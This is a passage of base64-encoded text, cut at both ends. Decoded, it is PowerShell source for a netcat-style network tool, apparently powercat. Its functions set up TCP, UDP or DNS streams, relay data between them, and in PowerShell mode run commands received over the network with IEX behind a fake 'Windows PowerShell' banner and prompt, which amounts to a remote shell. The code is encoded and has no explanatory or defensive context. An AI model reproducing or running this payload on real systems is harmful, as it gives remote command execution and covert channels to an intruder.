AgICAkRnVuY1ZhcnNbIlByb2Nlc3MiXS5TdGFuZGFyZElucHV0LldyaXRlTGluZSgkRnVuY1ZhcnNbIkVuY29kaW5nIl0uR2V0U3RyaW5nKCREYXRhKS5UcmltRW5kKCJgciIpLlRyaW1FbmQoImBuIikpCiAgICByZXR1cm4gJEZ1bmNWYXJzCiAgfQogIGZ1bmN0aW9uIENsb3NlX0NNRAogIHsKICAgIHBhcmFtKCRGdW5jVmFycykKICAgICRGdW5jVmFyc1siUHJvY2VzcyJdIHwgU3RvcC1Qcm9jZXNzCiAgfQogICMjIyMjIyMjIyMgQ01EIEZVTkNUSU9OUyAjIyMjIyMjIyMjCgogICMjIyMjIyMjIyMgUE9XRVJTSEVMTCBGVU5DVElPTlMgIyMjIyMjIyMjIwogIGZ1bmN0aW9uIE1haW5fUG93ZXJzaGVsbAogIHsKICAgIHBhcmFtKCRTdHJlYW0xU2V0dXBWYXJzKQogICAgdHJ5CiAgICB7CiAgICAgICRlbmNvZGluZyA9IE5ldy1PYmplY3QgU3lzdGVtLlRleHQuQXNjaWlFbmNvZGluZwogICAgICBbYnl0ZVtdXSRJbnB1dFRvV3JpdGUgPSBAKCkKICAgICAgaWYoJGkgLW5lICRudWxsKQogICAgICB7CiAgICAgICAgV3JpdGUtVmVyYm9zZSAiSW5wdXQgZnJvbSAtaSBkZXRlY3RlZC4uLiIKICAgICAgICBpZihUZXN0LVBhdGggJGkpeyBbYnl0ZVtdXSRJbnB1dFRvV3JpdGUgPSAoW2lvLmZpbGVdOjpSZWFkQWxsQnl0ZXMoJGkpKSB9CiAgICAgICAgZWxzZWlmKCRpLkdldFR5cGUoKS5OYW1lIC1lcSAiQnl0ZVtdIil7IFtieXRlW11dJElucHV0VG9Xcml0ZSA9ICRpIH0KICAgICAgICBlbHNlaWYoJGkuR2V0VHlwZSgpLk5hbWUgLWVxICJTdHJpbmciKXsgW2J5dGVbXV0kSW5wdXRUb1dyaXRlID0gJEVuY29kaW5nLkdldEJ5dGVzKCRpKSB9CiAgICAgICAgZWxzZXtXcml0ZS1Ib3N0ICJVbnJlY29nbmlzZWQgaW5wdXQgdHlwZS4iIDsgcmV0dXJufQogICAgICB9CgogICAgICBXcml0ZS1WZXJib3NlICJTZXR0aW5nIHVwIFN0cmVhbSAxLi4uIChFU0MvQ1RSTCB0byBleGl0KSIKICAgICAgdHJ5eyRTdHJlYW0xVmFycyA9IFN0cmVhbTFfU2V0dXAgJFN0cmVhbTFTZXR1cFZhcnN9CiAgICAgIGNhdGNoe1dyaXRlLVZlcmJvc2UgIlN0cmVhbSAxIFNldHVwIEZhaWx1cmUiIDsgcmV0dXJufQoKICAgICAgV3JpdGUtVmVyYm9zZSAiU2V0dGluZyB1cCBTdHJlYW0gMi4uLiAoRVNDL0NUUkwgdG8gZXhpdCkiCiAgICAgIHRyeQogICAgICB7CiAgICAgICAgJEludHJvUHJvbXB0ID0gJEVuY29kaW5nLkdldEJ5dGVzKCJXaW5kb3dzIFBvd2VyU2hlbGxgbkNvcHlyaWdodCAoQykgMjAxMyBNaWNyb3NvZnQgQ29ycG9yYXRpb24uIEFsbCByaWdodHMgcmVzZXJ2ZWQuYG5gbiIgKyAoIlBTICIgKyAocHdkKS5QYXRoICsgIj4gIikpCiAgICAgICAgJFByb21wdCA9ICgiUFMgIiArIChwd2QpLlBhdGggKyAiPiAiKQogICAgICAgICRDb21tYW5kVG9FeGVjdXRlID0gIiIKICAgICAgICAkRGF0YSA9ICRudWxsCiAgICAgIH0KICAgICAgY2F0Y2gKICAgICAgewogICAgICAgIFdyaXRlLVZlcmJvc2UgIlN0cmVhbSAyIFNldHVwIEZhaWx1cmUoiIDsgcmV0dXJuCiAgICAgIH0KCiAgICAgIGlmKCRJbnB1dFRvV3JpdGUgLW5lIEAoKSkKICAgICAgewogICAgICAgIFdyaXRlLVZlcmJvc2UgIldyaXRpbmcgaW5wdXQgdG8gU3RyZWFtIDEuLi4iCiAgICAgICAgdHJ5eyRTdHJlYW0xVmFycyA9IFN0cmVhbTFfV3JpdGVEYXRhICRJbnB1dFRvV3JpdGUgJFN0cmVhbTFWYXJzfQogICAgICAgIGNhdGNoe1dyaXRlLUhvc3QgIkZhaWxlZCB0byB3cml0ZSBpbnB1dCB0byBTdHJlYW0gMSIgOyByZXR1cm59CiAgICAgIH0KCiAgICAgIGlmKCRkKXtXcml0ZS1WZXJib3NlICItZCAoZGlzY29ubmVjdCkgQWN0aXZhdGVkLiBEaXNjb25uZWN0aW5nLi4uIiA7IHJldHVybn0KCiAgICAgIFdyaXRlLVZlcmJvc2UgIkJvdGggQ29tbXVuaWNhdGlvbiBTdHJlYW1zIEVzdGFibGlzaGVkLiBSZWRpcmVjdGluZyBEYXRhIEJldHdlZW4gU3RyZWFtcy4uLiIKICAgICAgd2hpbGUoJFRydWUpCiAgICAgIHsKICAgICAgICB0cnkKICAgICAgICB7CiAgICAgICAgICAjIyMjIyBTdHJlYW0yIFJlYWQgIyMjIyMKICAgICAgICAgICRQcm9tcHQgPSAkbnVsbAogICAgICAgICAgJFJldHVybmVkRGF0YSA9ICRudWxsCiAgICAgICAgICBpZigkQ29tbWFuZFRvRXhlY3V0ZSAtbmUgIiIpCiAgICAgICAgICB7CiAgICAgICAgICAgIHRyeXtbYnl0ZVtdXSRSZXR1cm5lZERhdGEgPSAkRW5jb2RpbmcuR2V0Qnl0ZXMoKElFWCAkQ29tbWFuZFRvRXhlY3V0ZSAyPiYxIHwgT3V0LVN0cmluZykpfQogICAgICAgICAgICBjYXRjaHtbYnl0ZVtdXSRSZXR1cm5lZERhdGEgPSAkRW5jb2RpbmcuR2V0Qnl0ZXMoKCRfIHwgT3V0LVN0cmluZykpfQogICAgICAgICAgICAkUHJvbXB0ID0gJEVuY29kaW5nLkdldEJ5dGVzKCgiUFMgIiArIChwd2QpLlBhdGggKyAiPiAiKSkKICAgICAgICAgIH0KICAgICAgICAgICREYXRhICs9ICRJbnRyb1Byb21wdAogICAgICAgICAgJEludHJvUHJvbXB0ID0gJG51bGwKICAgICAgICAgICREYXRhICs9ICRSZXR1cm5lZERhdGEKICAgICAgICAgICREYXRhICs9ICRQcm9tcHQKICAgICAgICAgICRDb21tYW5kVG9FeGVjdXRlID0gIiIKICAgICAgICAgICMjIyMjIFN0cmVhbTIgUmVhZCAjIyMjIwoKICAgICAgICAgIGlmKCREYXRhIC1uZSAkbnVsbCl7JFN0cmVhbTFWYXJzID0gU3RyZWFtMV9Xcml0ZURhdGEgJERhdGEgJFN0cmVhbTFWYXJzfQogICAgICAgICAgJERhdGEgPSAkbnVsbAogICAgICAgIH0KICAgICAgICBjYXRjaAogICAgICAgIHsKICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkZhaWxlZCB0byByZWRpcmVjdCBkYXRhIGZyb20gU3RyZWFtIDIgdG8gU3RyZWFtIDEiIDsgcmV0dXJuCiAgICAgICAgfQoKICAgICAgICB0cnkKICAgICAgICB7CiAgICAgICAgICAkRGF0YSwkU3RyZWFtMVZhcnMgPSBTdHJlYW0xX1JlYWREYXRhICRTdHJlYW0xVmFycwogICAgICAgICAgaWYoJERhdGEuTGVuZ3RoIC1lcSAwKXtTdGFydC1TbGVlcCAtTWlsbGlzZWNvbmRzIDEwMH0KICAgICAgICAgIGlmKCREYXRhIC1uZSAkbnVsbCl7JENvbW1hbmRUb0V4ZWN1dGUgPSAkRW5jb2RpbmcuR2V0U3RyaW5nKCREYXRhKX0KICAgICAgICAgICREYXRhID0gJG51bGwKICAgICAgICB9CiAgICAgICAgY2F0Y2gKICAgICAgICB7CiAgICAgICAgICBXcml0ZS1WZXJib3NlICJGYWlsZWQgdG8gcmVkaXJlY3QgZGF0YSBmcm9tIFN0cmVhbSAxIHRvIFN0cmVhbSAyIiA7IHJldHVybgogICAgICAgIH0KICAgICAgfQogICAgfQogICAgZmluYWxseQogICAgewogICAgICB0cnkKICAgICAgewogICAgICAgIFdyaXRlLVZlcmJvc2UgIkNsb3NpbmcgU3RyZWFtIDEuLi4iCiAgICAgICAgU3RyZWFtMV9DbG9zZSAkU3RyZWFtMVZhcnMKICAgICAgfQogICAgICBjYXRjaAogICAgICB7CiAgICAgICAgV3JpdGUtVmVyYm9zZSAiRmFpbGVkIHRvIGNsb3NlIFN0cmVhbSAxIgogICAgICB9CiAgICB9CiAgfQogICMjIyMjIyMjIyMgUE9XRVJTSEVMTCBGVU5DVElPTlMgIyMjIyMjIyMjIwoKICAjIyMjIyMjIyMjIENPTlNPTEUgRlVOQ1RJT05TICMjIyMjIyMjIyMKICBmdW5jdGlvbiBTZXR1cF9Db25zb2xlCiAgewogICAgcGFyYW0oJEZ1bmNTZXR1cFZhcnMpCiAgICAkRnVuY1ZhcnMgPSBAe30KICAgICRGdW5jVmFyc1siRW5jb2RpbmciXSA9IE5ldy1PYmplY3QgU3lzdGVtLlRleHQuQXNjaWlFbmNvZGluZwogICAgJEZ1bmNWYXJzWyJPdXRwdXQiXSA9ICRGdW5jU2V0dXBWYXJzWzBdCiAgICAkRnVuY1ZhcnNbIk91dHB1dEJ5dGVzIl0gPSBbYnl0ZVtdXUAoKQogICAgJEZ1bmNWYXJzWyJPdXRwdXRTdHJpbmciXSA9ICIiCiAgICByZXR1cm4gJEZ1bmNWYXJzCiAgfQogIGZ1bmN0aW9uIFJlYWREYXRhX0NvbnNvbGUKICB7CiAgICBwYXJhbSgkRnVuY1ZhcnMpCiAgICAkRGF0YSA9ICRudWxsCiAgICBpZigkSG9zdC5VSS5SYXdVSS5LZXlBdmFpbGFibGUpCiAgICB7CiAgICAgICREYXRhID0gJEZ1bmNWYXJzWyJFbmNvZGluZyJdLkdldEJ5dGVzKChSZWFkLUhvc3QpICsgImBuIikKICAgIH0KICAgIHJldHVybiAkRGF0YSwkRnVuY1ZhcnMKICB9CiAgZnVuY3Rpb24gV3JpdGVEYXRhX0NvbnNvbGUKICB7CiAgICBwYXJhbSgkRGF0YSwkRnVuY1ZhcnMpCiAgICBzd2l0Y2goJEZ1bmNWYXJzWyJPdXRwdXQiXSkKICAgIHsKICAgICAgIkhvc3QiIHtXcml0ZS1Ib3N0IC1uICRGdW5jVmFyc1siRW5jb2RpbmciXS5HZXRTdHJpbmcoJERhdGEpfQogICAgICAiU3RyaW5nIiB7JEZ1bmNWYXJzWyJPdXRwdXRTdHJpbmciXSArPSAkRnVuY1ZhcnNbIkVuY29kaW5nIl0uR2V0U3RyaW5nKCREYXRhKX0KICAgICAgIkJ5dGVzIiB7JEZ1bmNWYXJzWyJPdXRwdXRCeXRlcyJdICs9ICREYXRhfQogICAgfQogICAgcmV0dXJuICRGdW5jVmFycwogIH0KICBmdW5jdGlvbiBDbG9zZV9Db25zb2xlCiAgewogICAgcGFyYW0oJEZ1bmNWYXJzKQogICAgaWYoJEZ1bmNWYXJzWyJPdXRwdXRTdHJpbmciXSAtbmUgIiIpe3JldHVybiAkRnVuY1ZhcnNbIk91dHB1dFN0cmluZyJdfQogICAgZWxzZWlmKCRGdW5jVmFyc1siT3V0cHV0Qnl0ZXMiXSAtbmUgQCgpKXtyZXR1cm4gJEZ1bmNWYXJzWyJPdXRwdXRCeXRlcyJdfQogICAgcmV0dXJuCiAgfQogICMjIyMjIyMjIyMgQ09OU09MRSBGVU5DVElPTlMgIyMjIyMjIyMjIwoKICAjIyMjIyMjIyMjIE1BSU4gRlVOQ1RJT04gIyMjIyMjIyMjIwogIGZ1bmN0aW9uIE1haW4KICB7CiAgICBwYXJhbSgkU3RyZWFtMVNldHVwVmFycywkU3RyZWFtMlNldHVwVmFycykKICAgIHRyeQogICAgewogICAgICBbYnl0ZVtdXSRJbnB1dFRvV3JpdGUgPSBAKCkKICAgICAgJEVuY29kaW5nID0gTmV3LU9iamVjdCBTeXN0ZW0uVGV4dC5Bc2NpaUVuY29kaW5nCiAgICAgIGlmKCRpIC1uZSAkbnVsbCkKICAgICAgewogICAgICAgIFdyaXRlLVZlcmJvc2UgIklucHV0IGZyb20gLWkgZGV0ZWN0ZWQuLi4iCiAgICAgICAgaWYoVGVzdC1QYXRoICRpKXsgW2J5dGVbXV0kSW5wdXRUb1dyaXRlID0gKFtpby5maWxlXTo6UmVhZEFsbEJ5dGVzKCRpKSkgfQogICAgICAgIGVsc2VpZigkaS5HZXRUeXBlKCkuTmFtZSAtZXEgIkJ5dGVbXSIpeyBbYnl0ZVtdXSRJbnB1dFRvV3JpdGUgPSAkaSB9CiAgICAgICAgZWxzZWlmKCRpLkdldFR5cGUoKS5OYW1lIC1lcSAiU3RyaW5nIil7IFtieXRlW11dJElucHV0VG9Xcml0ZSA9ICRFbmNvZGluZy5HZXRCeXRlcygkaSkgfQogICAgICAgIGVsc2V7V3JpdGUtSG9zdCAiVW5yZWNvZ25pc2VkIGlucHV0IHR5cGUuIiA7IHJldHVybn0KICAgICAgfQoKICAgICAgV3JpdGUtVmVyYm9zZSAiU2V0dGluZyB1cCBTdHJlYW0gMS4uLiIKICAgICAgdHJ5eyRTdHJlYW0xVmFycyA9IFN0cmVhbTFfU2V0dXAgJFN0cmVhbTFTZXR1cFZhcnN9CiAgICAgIGNhdGNoe1dyaXRlLVZlcmJvc2UgIlN0cmVhbSAxIFNldHVwIEZhaWx1cmUiIDsgcmV0dXJufQoKICAgICAgV3JpdGUtVmVyYm9zZSAiU2V0dGluZyB1cCBTdHJlYW0gMi4uLiIKICAgICAgdHJ5eyRTdHJlYW0yVmFycyA9IFN0cmVhbTJfU2V0dXAgJFN0cmVhbTJTZXR1cFZhcnN9CiAgICAgIGNhdGNoe1dyaXRlLVZlcmJvc2UgIlN0cmVhbSAyIFNldHVwIEZhaWx1cmUiIDsgcmV0dXJufQoKICAgICAgJERhdGEgPSAkbnVsbAoKICAgICAgaWYoJElucHV0VG9Xcml0ZSAtbmUgQCgpKQogICAgICB7CiAgICAgICAgV3JpdGUtVmVyYm9zZSAiV3JpdGluZyBpbnB1dCB0byBTdHJlYW0gMS4uLiIKICAgICAgICB0cnl7JFN0cmVhbTFWYXJzID0gU3RyZWFtMV9Xcml0ZURhdGEgJElucHV0VG9Xcml0ZSAkU3RyZWFtMVZhcnN9CiAgICAgICAgY2F0Y2h7V3JpdGUtSG9zdCAiRmFpbGVkIHRvIHdyaXRlIGlucHV0IHRvIFN0cmVhbSAxIiA7IHJldHVybn0KICAgICAgfQoKICAgICAgaWYoJGQpe1dyaXRlLVZlcmJvc2UgIi1kIChkaXNjb25uZWN0KSBBY3RpdmF0ZWQuIERpc2Nvbm5lY3RpbmcuLi4iIDsgcmV0dXJufQoKICAgICAgV3JpdGUtVmVyYm9zZSAiQm90aCBDb21tdW5pY2F0aW9uIFN0cmVhbXMgRXN0YWJsaXNoZWQuIFJlZGlyZWN0aW5nIERhdGEgQmV0d2VlbiBTdHJlYW1zLi4uIgogICAgICB3aGlsZSgkVHJ1ZSkKICAgICAgewogICAgICAgIHRyeQogICAgICAgIHsKICAgICAgICAgICREYXRhLCRTdHJlYW0yVmFycyA9IFN0cmVhbTJfUmVhZERhdGEgJFN0cmVhbTJWYXJzCiAgICAgICAgICBpZigoJERhdGEuTGVuZ3RoIC1lcSAwKSAtb3IgKCREYXRhIC1lcSAkbnVsbCkpe1N0YXJ0LVNsZWVwIC1NaWxsaXNlY29uZHMgMTAwfQogICAgICAgICAgaWYoJERhdGEgLW5lICRudWxsKXskU3RyZWFtMVZhcnMgPSBTdHJlYW0xX1dyaXRlRGF0YSAkRGF0YSAkU3RyZWFtMVZhcnN9CiAgICAgICAgICAkRGF0YSA9ICRudWxsCiAgICAgICAgfQogICAgICAgIGNhdGNoCiAgICAgICAgewogICAgICAgICAgV3JpdGUtVmVyYm9zZSAiRmFpbGVkIHRvIHJlZGlyZWN0IGRhdGEgZnJvbSBTdHJlYW0gMiB0byBTdHJlYW0gMSIgOyByZXR1cm4KICAgICAgICB9CgogICAgICAgIHRyeQogICAgICAgIHsKICAgICAgICAgICREYXRhLCRTdHJlYW0xVmFycyA9IFN0cmVhbTFfUmVhZERhdGEgJFN0cmVhbTFWYXJzCiAgICAgICAgICBpZigoJERhdGEuTGVuZ3RoIC1lcSAwKSAtb3IgKCREYXRhIC1lcSAkbnVsbCkpe1N0YXJ0LVNsZWVwIC1NaWxsaXNlY29uZHMgMTAwfQogICAgICAgICAgaWYoJERhdGEgLW5lICRudWxsKXskU3RyZWFtMlZhcnMgPSBTdHJlYW0yX1dyaXRlRGF0YSAkRGF0YSAkU3RyZWFtMlZhcnN9CiAgICAgICAgICAkRGF0YSA9ICRudWxsCiAgICAgICAgfQogICAgICAgIGNhdGNoCiAgICAgICAgewogICAgICAgICAgV3JpdGUtVmVyYm9zZSAiRmFpbGVkIHRvIHJlZGlyZWN0IGRhdGEgZnJvbSBTdHJlYW0gMSB0byBTdHJlYW0gMiIgOyByZXR1cm4KICAgICAgICB9CiAgICAgIH0KICAgIH0KICAgIGZpbmFsbHkKICAgIHsKICAgICAgdHJ5CiAgICAgIHsKICAgICAgICAjV3JpdGUtVmVyYm9zZSAiQ2xvc2luZyBTdHJlYW0gMi4uLiIKICAgICAgICBTdHJlYW0yX0Nsb3NlICRTdHJlYW0yVmFycwogICAgICB9CiAgICAgIGNhdGNoCiAgICAgIHsKICAgICAgICBXcml0ZS1WZXJib3NlICJGYWlsZWQgdG8gY2xvc2UgU3RyZWFtIDIiCiAgICAgIH0KICAgICAgdHJ5CiAgICAgIHsKICAgICAgICAjV3JpdGUtVmVyYm9zZSAiQ2xvc2luZyBTdHJlYW0gMS4uLiIKICAgICAgICBTdHJlYW0xX0Nsb3NlICRTdHJlYW0xVmFycwogICAgICB9CiAgICAgIGNhdGNoCiAgICAgIHsKICAgICAgICBXcml0ZS1WZXJib3NlICJGYWlsZWQgdG8gY2xvc2UgU3RyZWFtIDEiCiAgICAgIH0KICAgIH0KICB9CiAgIyMjIyMjIyMjIyBNQUlOIEZVTkNUSU9OICMjIyMjIyMjIyMKCiAgIyMjIyMjIyMjIyBHRU5FUkFURSBQQVlMT0FEICMjIyMjIyMjIyMKICBpZigkdSkKICB7CiAgICBXcml0ZS1WZXJib3NlICJTZXQgU3RyZWFtIDE6IFVEUCIKICAgICRGdW5jdGlvblN0cmluZyA9ICgiZnVuY3Rpb24gU3RyZWFtMV9TZXR1cGBue2BuIiArICR7ZnVuY3Rpb246U2V0dXBfVURQfSArICJgbn1gbmBuIikKICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTFfUmVhZERhdGFgbntgbiIgKyAke2Z1bmN0aW9uOlJlYWREYXRhX1VEUH0gKyAiYG59YG5gbiIpCiAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0xX1dyaXRlRGF0YWBue2BuIiArICR7ZnVuY3Rpb246V3JpdGVEYXRhX1VEUH0gKyAiYG59YG5gbiIpCiAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0xX0Nsb3NlYG57YG4iICsgJHtmdW5jdGlvbjpDbG9zZV9VRFB9ICsgImBufWBuYG4iKQogICAgaWYoJGwpeyRJbnZva2VTdHJpbmcgPSAiTWFpbiBAKCcnLGAkVHJ1ZSwnJHAnLCckdCcpICJ9CiAgICBlbHNleyRJbnZva2VTdHJpbmcgPSAiTWFpbiBAKCckYycsYCRGYWxzZSwnJHAnLCckdCcpICJ9CiAgfQogIGVsc2VpZigkZG5zIC1uZSAiIikKICB7CiAgICBXcml0ZS1WZXJib3NlICJTZXQgU3RyZWFtIDE6IEROUyIKICAgICRGdW5jdGlvblN0cmluZyA9ICgiZnVuY3Rpb24gU3RyZWFtMV9TZXR1cGBue2BuIiArICR7ZnVuY3Rpb246U2V0dXBfRE5TfSArICJgbn1gbmBuIikKICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTFfUmVhZERhdGFgbntgbiIgKyAke2Z1bmN0aW9uOlJlYWREYXRhX0ROU30gKyAiYG59YG5gbiIpCiAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0xX1dyaXRlRGF0YWBue2BuIiArICR7ZnVuY3Rpb246V3JpdGVEYXRhX0ROU30gKyAiYG59YG5gbiIpCiAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0xX0Nsb3NlYG57YG4iICsgJHtmdW5jdGlvbjpDbG9zZV9ETlN9ICsgImBufWBuYG4iKQogICAgaWYoJGwpe3JldHVybiAiVGhpcyBmZWF0dXJlIGlzIG5vdCBhdmFpbGFibGUuIn0KICAgIGVsc2V7JEludm9rZVN0cmluZyA9ICJNYWluIEAoJyRjJywnJHAnLCckZG5zJywkZG5zZnQpICJ9CiAgfQogIGVsc2UKICB7CiAgICBXcml0ZS1WZXJib3NlICJTZXQgU3RyZWFtIDE6IFRDUCIKICAgICRGdW5jdGlvblN0cmluZyA9ICgiZnVuY3Rpb24gU3RyZWFtMV9TZXR1cGBue2BuIiArICR7ZnVuY3Rpb246U2V0dXBfVENQfSArICJgbn1gbmBuIikKICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTFfUmVhZERhdGFgbntgbiIgKyAke2Z1bmN0aW9uOlJlYWREYXRhX1RDUH0gKyAiYG59YG5gbiIpCiAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0xX1dyaXRlRGF0YWBue2BuIiArICR7ZnVuY3Rpb246V3JpdGVEYXRhX1RDUH0gKyAiYG59YG5gbiIpCiAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0xX0Nsb3NlYG57YG4iICsgJHtmdW5jdGlvbjpDbG9zZV9UQ1B9ICsgImBufWBuYG4iKQogICAgaWYoJGwpeyRJbnZva2VTdHJpbmcgPSAiTWFpbiBAKCcnLGAkVHJ1ZSwkcCwkdCkgIn0KICAgIGVsc2V7JEludm9rZVN0cmluZyA9ICJNYWluIEAoJyRjJyxgJEZhbHNlLCRwLCR0KSAifQogIH0KCiAgaWYoJGUgLW5lICIiKQogIHsKICAgIFdyaXRlLVZlcmJvc2UgIlNldCBTdHJlYW0gMjogUHJvY2VzcyIKICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTJfU2V0dXBgbntgbiIgKyAke2Z1bmN0aW9uOlNldHVwX0NNRH0gKyAiYG59YG5gbiIpCiAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0yX1JlYWREYXRhYG57YG4iICsgJHtmdW5jdGlvbjpSZWFkRGF0YV9DTUR9ICsgImBufWBuYG4iKQogICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMl9Xcml0ZURhdGFgbntgbiIgKyAke2Z1bmN0aW9uOldyaXRlRGF0YV9DTUR9ICsgImBufWBuYG4iKQogICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMl9DbG9zZWBue2BuIiArICR7ZnVuY3Rpb246Q2xvc2VfQ01EfSArICJgbn1gbmBuIikKICAgICRJbnZva2VTdHJpbmcgKz0gIkAoJyRlJylgbmBuIgogIH0KICBlbHNlaWYoJGVwKQogIHsKICAgIFdyaXRlLVZlcmJvc2UgIlNldCBTdHJlYW0gMjogUG93ZXJzaGVsbCIKICAgICRJbnZva2VTdHJpbmcgKz0gImBuYG4iCiAgfQogIGVsc2VpZigkciAtbmUgIiIpCiAgewogICAgaWYoJHIuc3BsaXQoIjoiKVswXS5Ub0xvd2VyKCkgLWVxICJ1ZHAiKQogICAgewogICAgICBXcml0ZS1WZXJib3NlICJTZXQgU3RyZWFtIDI6IFVEUCIKICAgICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMl9TZXR1cGBue2BuIiArICR7ZnVuY3Rpb246U2V0dXBfVURQfSArICJgbn1gbmBuIikKICAgICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMl9SZWFkRGF0YWBue2BuIiArICR7ZnVuY3Rpb246UmVhZERhdGFfVURQfSArICJgbn1gbmBuIikKICAgICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMl9Xcml0ZURhdGFgbntgbiIgKyAke2Z1bmN0aW9uOldyaXRlRGF0YV9VRFB9ICsgImBufWBuYG4iKQogICAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0yX0Nsb3NlYG57YG4iICsgJHtmdW5jdGlvbjpDbG9zZV9VRFB9ICsgImBufWBuYG4iKQogICAgICBpZigkci5zcGxpdCgiOiIpLkNvdW50IC1lcSAyKXskSW52b2tlU3RyaW5nICs9ICgiQCgnJyxgJFRydWUsJyIgKyAkci5zcGxpdCgiOiIpWzFdICsgIicsJyR0JykgIil9CiAgICAgIGVsc2VpZigkci5zcGxpdCgiOiIpLkNvdW50IC1lcSAzKXskSW52b2tlU3RyaW5nICs9ICgiQCgnIiArICRyLnNwbGl0KCI6IilbMV0gKyAiJyxgJEZhbHNlLCciICsgJHIuc3BsaXQoIjoiKVsyXSArICInLCckdCcpICIpfQogICAgICBlbHNle3JldHVybiAiQmFkIHJlbGF5IGZvcm1hdC4ifQogICAgfQogICAgaWYoJHIuc3BsaXQoIjoiKVswXS5Ub0xvd2VyKCkgLWVxICJkbnMiKQogICAgewogICAgICBXcml0ZS1WZXJib3NlICJTZXQgU3RyZWFtIDI6IEROUyIKICAgICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMl9TZXR1cGBue2BuIiArICR7ZnVuY3Rpb246U2V0dXBfRE5TfSArICJgbn1gbmBuIikKICAgICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMl9SZWFkRGF0YWBue2BuIiArICR7ZnVuY3Rpb246UmVhZERhdGFfRE5TfSArICJgbn1gbmBuIikKICAgICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMl9Xcml0ZURhdGFgbntgbiIgKyAke2Z1bmN0aW9uOldyaXRlRGF0YV9ETlN9ICsgImBufWBuYG4iKQogICAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0yX0Nsb3NlYG57YG4iICsgJHtmdW5jdGlvbjpDbG9zZV9ETlN9ICsgImBufWBuYG4iKQogICAgICBpZigkci5zcGxpdCgiOiIpLkNvdW50IC1lcSAyKXtyZXR1cm4gIlRoaXMgZmVhdHVyZSBpcyBub3QgYXZhaWxhYmxlLiJ9CiAgICAgIGVsc2VpZigkci5zcGxpdCgiOiIpLkNvdW50IC1lcSA0KXskSW52b2tlU3RyaW5nICs9ICgiQCgnIiArICRyLnNwbGl0KCI6IilbMV0gKyAiJywnIiArICRyLnNwbGl0KCI6IilbMl0gKyAiJywnIiArICRyLnNwbGl0KCI6IilbM10gKyAiJywkZG5zZnQpICIpfQogICAgICBlbHNle3JldHVybiAiQmFkIHJlbGF5IGZvcm1hdC4ifQogICAgfQogICAgZWxzZWlmKCRyLnNwbGl0KCI6IilbMF0uVG9Mb3dlcigpIC1lcSAidGNwIikKICAgIHsKICAgICAgV3JpdGUtVmVyYm9zZSAiU2V0IFN0cmVhbSAyOiBUQ1AiCiAgICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTJfU2V0dXBgbntgbiIgKyAke2Z1bmN0aW9uOlNldHVwX1RDUH0gKyAiYG59YG5gbiIpCiAgICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTJfUmVhZERhdGFgbntgbiIgKyAke2Z1bmN0aW9uOlJlYWREYXRhX1RDUH0gKyAiYG59YG5gbiIpCiAgICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTJfV3JpdGVEYXRhYG57YG4iICsgJHtmdW5jdGlvbjpXcml0ZURhdGFfVENQfSArICJgbn1gbmBuIikKICAgICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMl9DbG9zZWBue2BuIiArICR7ZnVuY3Rpb246Q2xvc2VfVENQfSArICJgbn1gbmBuIikKICAgICAgaWYoJHIuc3BsaXQoIjoiKS5Db3VudCAtZXEgMil7JEludm9rZVN0cmluZyArPSAoIkAoJycsYCRUcnVlLCciICsgJHIuc3BsaXQoIjoiKVsxXSArICInLCckdCcpICIpfQogICAgICBlbHNlaWYoJHIuc3BsaXQoIjoiKS5Db3VudCAtZXEgMyl7JEludm9rZVN0cmluZyArPSAoIkAoJyIgKyAkci5zcGxpdCgiOiIpWzFdICsgIicsYCRGYWxzZSwnIiArICRyLnNwbGl0KCI6IilbMl0gKyAiJywnJHQnKSAiKX0KICAgICAgZWxzZXtyZXR1cm4gIkJhZCByZWxheSBmb3JtYXQuIn0KICAgIH0KICB9CiAgZWxzZQogIHsKICAgIFdyaXRlLVZlcmJvc2UgIlNldCBTdHJlYW0gMjogQ29uc29sZSIKICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTJfU2V0dXBgbntgbiIgKyAke2Z1bmN0aW9uOlNldHVwX0NvbnNvbGV9ICsgImBufWBuYG4iKQogICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMl9SZWFkRGF0YWBue2BuIiArICR7ZnVuY3Rpb246UmVhZERhdGFfQ29uc